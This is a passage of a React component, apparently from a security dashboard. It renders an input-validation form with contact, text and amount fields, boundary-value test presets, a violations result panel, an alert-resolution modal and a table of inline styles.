                      style={{ height: 100, resize: 'vertical', fontFamily: 'monospace', fontSize: '0.82rem' }}
                      value={vInput}
                      onChange={e => setVInput(e.target.value)}
                      placeholder={vContext === 'search' ? 'Enter a search query…' : 'Enter any text to validate…'}
                    />
                  </div>
                )}

                {vContext === 'contact' && (
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                    {[
                      { key: 'phone',   label: 'Phone',   placeholder: '9876543210' },
                      { key: 'email',   label: 'Email',   placeholder: 'user@example.com' },
                      { key: 'pincode', label: 'Pincode', placeholder: '400069' },
                      { key: 'name',    label: 'Name',    placeholder: 'Anjali Patel' },
                    ].map(f => (
                      <div key={f.key} className="form-group">
                        <label style={{ fontSize: '0.8rem' }}>{f.label}</label>
                        <input className="input" placeholder={f.placeholder}
                          value={vContactFields[f.key]}
                          onChange={e => setVContactFields(prev => ({ ...prev, [f.key]: e.target.value }))} />
                      </div>
                    ))}
                  </div>
                )}

                {vContext === 'amount' && (
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                    <div className="form-group">
                      <label style={{ fontSize: '0.8rem' }}>Amount (₹)</label>
                      <input className="input" type="number" placeholder="e.g. 2499"
                        value={vAmount} onChange={e => setVAmount(e.target.value)} />
                    </div>
                    <div className="form-group">
                      <label style={{ fontSize: '0.8rem' }}>Context</label>
                      <select className="input" value={vAmountCtx} onChange={e => setVAmountCtx(e.target.value)}>
                        <option value="order">Order</option>
                        <option value="refund">Refund</option>
                        <option value="product">Product price</option>
                      </select>
                    </div>
                    <div style={{ gridColumn: '1 / -1', marginBottom: 14 }}>
                      <div style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--muted)', marginBottom: 6 }}>Quick tests</div>
                      <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                        {[
                          { label: 'Negative (–500)', amount: '-500', ctx: 'order' },
                          { label: 'Zero (₹0)',        amount: '0',    ctx: 'order' },
                          { label: 'Over ₹1cr',        amount: '15000000', ctx: 'order' },
                          { label: 'Normal (₹2499)',   amount: '2499', ctx: 'order' },
                        ].map(p => (
                          <button key={p.label} style={s.presetBtn}
                            onClick={() => { setVAmount(p.amount); setVAmountCtx(p.ctx); setVResult(null) }}>
                            {p.label}
                          </button>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                <button className="btn btn-primary" style={{ width: '100%', marginTop: 8 }}
                  disabled={vLoading} onClick={validate}>
                  {vLoading ? 'Validating…' : 'Validate'}
                </button>
              </div>
            </div>

            {/* Result panel */}
            <div style={s.card}>
              <div style={s.cardHead}>Result</div>
              <div style={{ padding: '16px 18px' }}>
                {!vResult && !vLoading && (
                  <div style={{ textAlign: 'center', padding: '40px 0', color: 'var(--muted)', fontSize: '0.85rem' }}>
                    <div style={{ fontSize: '2.5rem', marginBottom: 10 }}>🔍</div>
                    Submit an input to see the validation result
                  </div>
                )}
                {vLoading && <div style={{ textAlign: 'center', padding: '40px 0' }}><div className="spinner" style={{ margin: '0 auto' }} /></div>}
                {vResult && (
                  <div>
                    <div style={{ marginBottom: 16 }}>
                      <ActionBadge action={vResult.action} score={vResult.risk_score} />
                    </div>
                    {vResult.processing_time_ms !== undefined && (
                      <div style={{ fontSize: '0.72rem', color: 'var(--muted)', marginBottom: 14 }}>
                        Processed in {Number(vResult.processing_time_ms).toFixed(1)} ms
                        · {vResult.violations?.length ?? 0} violation(s)
                      </div>
                    )}
                    {vResult.violations?.length > 0 ? (
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                        <div style={{ fontSize: '0.8rem', fontWeight: 700, marginBottom: 2 }}>Violations</div>
                        {vResult.violations.map((v, i) => {
                          const sm = SEV_META[v.severity] || SEV_META.low
                          return (
                            <div key={i} style={{ borderLeft: `3px solid ${sm.color}`, background: sm.bg, borderRadius: '0 6px 6px 0', padding: '10px 12px' }}>
                              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
                                <SevBadge severity={v.severity} />
                                <code style={{ fontSize: '0.8rem', fontWeight: 700 }}>{v.rule_name}</code>
                              </div>
                              <div style={{ fontSize: '0.8rem', color: 'var(--muted)', marginBottom: v.matched?.length ? 6 : 0 }}>
                                {v.message}
                              </div>
                              {v.matched?.length > 0 && (
                                <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                                  {v.matched.map((m, j) => (
                                    <code key={j} style={{ fontSize: '0.72rem', background: 'rgba(0,0,0,.08)', padding: '2px 6px', borderRadius: 3 }}>
                                      {m}
                                    </code>
                                  ))}
                                </div>
                              )}
                            </div>
                          )
                        })}
                      </div>
                    ) : (
                      <div style={{ textAlign: 'center', padding: '20px', background: '#ECFDF5', borderRadius: 8, color: '#059669', fontWeight: 600, fontSize: '0.85rem' }}>
                        No violations detected
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

      </div>

      {/* ── Resolve Modal ── */}
      {resolveModal && (
        <div style={s.overlay} onClick={() => setResolveModal(null)}>
          <div style={s.modalBox} onClick={e => e.stopPropagation()}>
            <h2 style={{ fontSize: '1.1rem', marginBottom: 4 }}>
              {resolveModal.type === 'fp' ? 'Mark as False Positive' : 'Resolve Alert'}
            </h2>
            <p style={{ color: 'var(--muted)', fontSize: '0.8rem', marginBottom: 18 }}>
              {resolveModal.alert.title || resolveModal.alert.anomaly_type}
            </p>
            <div className="form-group">
              <label>Resolution note</label>
              <textarea className="input" style={{ height: 80, resize: 'vertical' }}
                value={resolveNote}
                onChange={e => setResolveNote(e.target.value)}
                placeholder={resolveModal.type === 'fp' ? 'Why is this a false positive?' : 'What action was taken?'}
              />
            </div>
            <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end', marginTop: 8 }}>
              <button className="btn btn-ghost" onClick={() => setResolveModal(null)}>Cancel</button>
              <button className="btn btn-primary" disabled={resolveSubmitting} onClick={submitResolve}>
                {resolveSubmitting ? 'Saving…' : resolveModal.type === 'fp' ? 'Mark False Positive' : 'Resolve'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

const s = {
  pageHeader: {
    display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between',
    marginBottom: 16, flexWrap: 'wrap', gap: 12,
  },
  portChip: {
    fontFamily: 'monospace', fontSize: '0.72rem', fontWeight: 700,
    padding: '5px 12px', borderRadius: 6, background: '#0D1117', color: '#58A6FF',
    border: '1px solid #30363D',
  },
  kpiStrip: {
    display: 'grid',
    gridTemplateColumns: 'repeat(7, 1fr)',
    gap: 10,
    marginBottom: 20,
  },
  kpiCard: {
    borderRadius: 'var(--radius)', padding: '12px 14px',
    display: 'flex', flexDirection: 'column', alignItems: 'center',
    justifyContent: 'center', textAlign: 'center',
  },
  tabBar: {
    display: 'flex', gap: 0, borderBottom: '2px solid var(--border)', marginBottom: 24,
  },
  tab: {
    padding: '10px 20px', border: 'none', background: 'none',
    fontSize: '0.9rem', fontWeight: 600, color: 'var(--muted)',
    borderBottom: '2px solid transparent', marginBottom: -2,
    cursor: 'pointer', transition: 'color .15s, border-color .15s',
  },
  tabActive: {
    color: 'var(--primary)', borderBottomColor: 'var(--primary)',
  },
  card: {
    background: 'var(--surface)', border: '1px solid var(--border)',
    borderRadius: 'var(--radius-lg)', overflow: 'hidden',
  },
  cardHead: {
    padding: '11px 18px', borderBottom: '1px solid var(--border)',
    fontWeight: 700, fontSize: '0.85rem', background: 'var(--ground)',
  },
  filterRow: {
    display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', marginBottom: 16,
  },
  chip: {
    padding: '5px 14px', borderRadius: 20, border: '1.5px solid var(--border)',
    background: 'var(--surface)', fontSize: '0.8rem', fontWeight: 600,
    color: 'var(--muted)', cursor: 'pointer', transition: 'all .15s',
  },
  chipActive: {
    background: 'var(--primary)', color: '#fff', borderColor: 'var(--primary)',
  },
  presetBtn: {
    padding: '4px 10px', borderRadius: 6, border: '1px solid var(--border)',
    background: 'var(--ground)', fontSize: '0.74rem', fontWeight: 600,
    color: 'var(--muted)', cursor: 'pointer',
  },
  table: {
    width: '100%', borderCollapse: 'collapse', fontSize: '0.875rem',
    background: 'var(--surface)', borderRadius: 'var(--radius-lg)',
    overflow: 'hidden', border: '1px solid var(--border)',
  },
  th: {
    textAlign: 'left', padding: '10px 14px',
    fontSize: '0.7rem', letterSpacing: '.06em', textTransform: 'uppercase',
    color: 'var(--muted)', fontWeight: 700,
    background: 'var(--ground)', borderBottom: '2px solid var(--border)',
  },
  td: {
    padding: '12px 14px', borderBottom: '1px solid var(--border)', verticalAlign: 'middle',
  },
  tr: { transition: 'background .1s' },
  alertRow: {
    display: 'flex', alignItems: 'flex-start', gap: 16,
    padding: '14px 18px',
    background: 'var(--surface)',
    borderBottom: '1px solid var(--border)',
  },
  overlay: {
    position: 'fixed', inset: 0, background: 'rgba(0,0,0,.45)',
    display: 'flex', alignItems: 'center', justifyContent: 'center',
    zIndex: 1000, padding: 20,
  },
  modalBox: {
    background: 'var(--surface)', borderRadius: 'var(--radius-lg)',
    padding: '28px 32px', width: '100%', maxWidth: 480,
    boxShadow: 'var(--shadow-lg)',
  },
}
